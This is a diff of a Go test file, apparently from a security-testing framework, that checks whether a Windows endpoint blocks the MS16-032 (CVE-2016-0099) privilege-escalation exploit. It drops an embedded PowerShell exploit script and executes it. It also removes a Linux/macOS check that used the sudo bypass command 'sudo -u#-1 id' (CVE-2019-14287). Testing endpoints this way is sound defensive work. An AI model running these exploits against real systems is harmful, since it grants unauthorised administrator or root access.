@@ -1,6 +1,9 @@
+//go:build windows
+// +build windows
+
 /*
 ID: d36c6715-ac9d-4d22-b6d3-cc778dac473b
-NAME: CVE-2019-14287 and CVE-2016-0099
+NAME: CVE-2016-0099
 CREATED: 2023-02-15
 */
 package main
@@ -18,16 +21,12 @@ var path = "Invoke-MS16032.ps1"
 
 var supported = map[string][]string{
 	"windows": {"powershell.exe", "-c", path},
-	"darwin":  {"bash", "-c", "sudo -u#-1 id"},
-	"linux":   {"bash", "-c", "sudo -u#-1 id"},
 }
 
 func test() {
 	command := supported[runtime.GOOS]
-	if runtime.GOOS == "windows" {
-		Endpoint.Write(path, ms16032)
-	}
-	println("[+] Testing CVE-2019-14287 on Linux/Darwin OR CVE-2016-0099 on Windows.")
+	Endpoint.Write(path, ms16032)
+	println("[+] Testing CVE-2016-0099")
 	cmd, err := Endpoint.Shell(command)
 	if err != nil {
 		println("[+] The test was prevented or machine not vulnerable")
